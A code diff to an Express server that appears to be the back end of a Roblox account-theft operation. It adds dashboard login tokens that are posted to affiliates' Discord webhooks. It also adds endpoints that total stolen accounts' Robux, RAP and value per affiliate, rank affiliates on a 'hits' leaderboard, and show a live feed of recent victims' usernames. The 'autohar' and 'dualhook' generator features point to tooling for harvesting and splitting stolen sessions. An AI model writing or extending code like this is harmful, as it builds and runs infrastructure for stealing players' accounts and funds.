@@ -198,12 +198,14 @@ app.post('/api/create-directory', async (req, res) => {
     }
 
     // Create new directory entry
+    const authToken = crypto.randomBytes(32).toString('hex');
     directories[directoryName] = {
       webhookUrl: webhookUrl,
       serviceType: serviceType || 'single',
       dualhookWebhookUrl: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
       created: new Date().toISOString(),
       apiToken: crypto.randomBytes(32).toString('hex'),
+      authToken: authToken, // For user dashboard login
       subdirectories: {} // For nested directories in dualhook
     };
 
@@ -214,14 +216,14 @@ app.post('/api/create-directory', async (req, res) => {
 
     console.log(`✅ Created new directory: ${directoryName}`);
 
-    // Send notification to the webhook about successful directory creation
+    // Send notification to the webhook about successful directory creation with auth token
     try {
       const serviceTypeLabel = serviceType === 'dualhook' 
         ? `${directoryName.toUpperCase()} GENERATOR` 
         : 'LUNIX AUTOHAR';
       const description = serviceType === 'dualhook' 
-        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\``
-        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\``;
+        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
+        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;
 
       const notificationPayload = {
         embeds: [{
@@ -253,11 +255,230 @@ app.post('/api/create-directory', async (req, res) => {
     res.json({ 
       success: true, 
       directoryName: directoryName,
-      apiToken: directories[directoryName].apiToken
+      apiToken: directories[directoryName].apiToken,
+      authToken: authToken
     });
 
   } catch (error) {
     console.error('Error creating directory:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Serve login page
+app.get('/login', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+// Serve dashboard page
+app.get('/dashboard', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
+});
+
+// API endpoint for user login
+app.post('/api/login', async (req, res) => {
+  try {
+    const { authToken } = req.body;
+
+    if (!authToken) {
+      return res.status(400).json({ error: 'Authentication token required' });
+    }
+
+    // Load directories and find matching auth token
+    const directories = await loadDirectories();
+    let foundDirectory = null;
+
+    for (const [dirName, dirConfig] of Object.entries(directories)) {
+      if (dirConfig.authToken === authToken) {
+        foundDirectory = dirName;
+        break;
+      }
+      
+      // Check subdirectories for dualhook services
+      if (dirConfig.subdirectories) {
+        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
+          if (subConfig.authToken === authToken) {
+            foundDirectory = `${dirName}/${subName}`;
+            break;
+          }
+        }
+      }
+      
+      if (foundDirectory) break;
+    }
+
+    if (!foundDirectory) {
+      return res.status(401).json({ error: 'Invalid authentication token' });
+    }
+
+    res.json({
+      success: true,
+      directoryName: foundDirectory
+    });
+
+  } catch (error) {
+    console.error('Error during login:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Middleware to authenticate dashboard requests
+function authenticateUser(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'Authentication required' });
+  }
+  
+  const token = authHeader.split(' ')[1];
+  req.userToken = token;
+  next();
+}
+
+// API endpoint to get user statistics
+app.get('/api/user-stats', authenticateUser, async (req, res) => {
+  try {
+    const authToken = req.userToken;
+    
+    // Find user's directory
+    const directories = await loadDirectories();
+    let userDirectory = null;
+    
+    for (const [dirName, dirConfig] of Object.entries(directories)) {
+      if (dirConfig.authToken === authToken) {
+        userDirectory = dirName;
+        break;
+      }
+      
+      if (dirConfig.subdirectories) {
+        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
+          if (subConfig.authToken === authToken) {
+            userDirectory = `${dirName}/${subName}`;
+            break;
+          }
+        }
+      }
+      
+      if (userDirectory) break;
+    }
+    
+    if (!userDirectory) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+
+    // Get user logs from Firebase
+    const logsRef = db.ref('user_logs');
+    const snapshot = await logsRef.once('value');
+    const allLogs = snapshot.val() || {};
+    
+    // Filter logs for this user
+    const userLogs = Object.values(allLogs).filter(log => 
+      log.context && (log.context.directory === userDirectory || 
+      log.context.directory === userDirectory.split('/')[0])
+    );
+
+    const today = new Date().toDateString();
+    const todayLogs = userLogs.filter(log => {
+      const logDate = new Date(log.timestamp).toDateString();
+      return logDate === today;
+    });
+
+    // Calculate statistics
+    const totalAccounts = userLogs.length;
+    const totalSummary = userLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
+    const totalRobux = userLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
+    const totalRAP = userLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
+    
+    const todayAccounts = todayLogs.length;
+    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
+    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
+    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
+
+    res.json({
+      totalAccounts,
+      totalSummary,
+      totalRobux,
+      totalRAP,
+      todayAccounts,
+      todaySummary,
+      todayRobux,
+      todayRAP
+    });
+
+  } catch (error) {
+    console.error('Error getting user stats:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// API endpoint to get global leaderboards
+app.get('/api/leaderboard', async (req, res) => {
+  try {
+    // Get all logs from Firebase
+    const logsRef = db.ref('user_logs');
+    const snapshot = await logsRef.once('value');
+    const allLogs = snapshot.val() || {};
+    
+    // Group logs by directory/user
+    const userStats = {};
+    
+    Object.values(allLogs).forEach(log => {
+      if (!log.context || !log.context.directory) return;
+      
+      const directory = log.context.directory;
+      if (!userStats[directory]) {
+        userStats[directory] = {
+          username: directory,
+          hits: 0,
+          lastHit: log.timestamp
+        };
+      }
+      
+      userStats[directory].hits++;
+      if (new Date(log.timestamp) > new Date(userStats[directory].lastHit)) {
+        userStats[directory].lastHit = log.timestamp;
+      }
+    });
+
+    // Sort by hits for global leaderboard
+    const globalLeaderboard = Object.values(userStats)
+      .sort((a, b) => b.hits - a.hits);
+
+    // Create live leaderboard (same data but could be filtered by time)
+    const liveLeaderboard = [...globalLeaderboard];
+
+    res.json({
+      global: globalLeaderboard,
+      live: liveLeaderboard
+    });
+
+  } catch (error) {
+    console.error('Error getting leaderboard:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// API endpoint to get live hits
+app.get('/api/live-hits', async (req, res) => {
+  try {
+    // Get recent logs from Firebase
+    const logsRef = db.ref('user_logs');
+    const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(20);
+    const snapshot = await recentLogsQuery.once('value');
+    const recentLogs = snapshot.val() || {};
+    
+    // Format for display
+    const liveHits = Object.values(recentLogs)
+      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+      .slice(0, 5)
+      .map(log => ({
+        username: log.userData.username || log.context?.directory || 'Unknown',
+        timestamp: log.timestamp
+      }));
+
+    res.json(liveHits);
+
+  } catch (error) {
+    console.error('Error getting live hits:', error);
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -1114,10 +1335,12 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     }
 
     // Create subdirectory
+    const subAuthToken = crypto.randomBytes(32).toString('hex');
     directories[parentDirectory].subdirectories[subdirectoryName] = {
       webhookUrl: webhookUrl,
       created: new Date().toISOString(),
-      apiToken: crypto.randomBytes(32).toString('hex')
+      apiToken: crypto.randomBytes(32).toString('hex'),
+      authToken: subAuthToken
     };
 
     // Save directories
@@ -1127,12 +1350,12 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
 
     console.log(`✅ Created subdirectory: ${parentDirectory}/${subdirectoryName}`);
 
-    // Send CREATION notification to subdirectory webhook with user's link (NOT the rich data embed)
+    // Send CREATION notification to subdirectory webhook with user's link and auth token
     try {
       const creationNotificationPayload = {
         embeds: [{
           title: `${parentDirectory.toUpperCase()} AUTOHAR`,
-          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\``,
+          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${subAuthToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``,
           color: 0x8B5CF6,
           footer: {
             text: `Made by ${parentDirectory}`
@@ -1148,7 +1371,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
         body: JSON.stringify(creationNotificationPayload)
       });
 
-      console.log(`✅ Sent subdirectory CREATION notification (simple embed) to: ${subdirectoryName}`);
+      console.log(`✅ Sent subdirectory CREATION notification with auth token to: ${subdirectoryName}`);
     } catch (webhookError) {
       console.log(`⚠️ Failed to send subdirectory creation notification: ${webhookError.message}`);
     }
@@ -1157,7 +1380,8 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
       success: true,
       parentDirectory: parentDirectory,
       subdirectoryName: subdirectoryName,
-      apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken
+      apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken,
+      authToken: subAuthToken
     });
 
   } catch (error) {
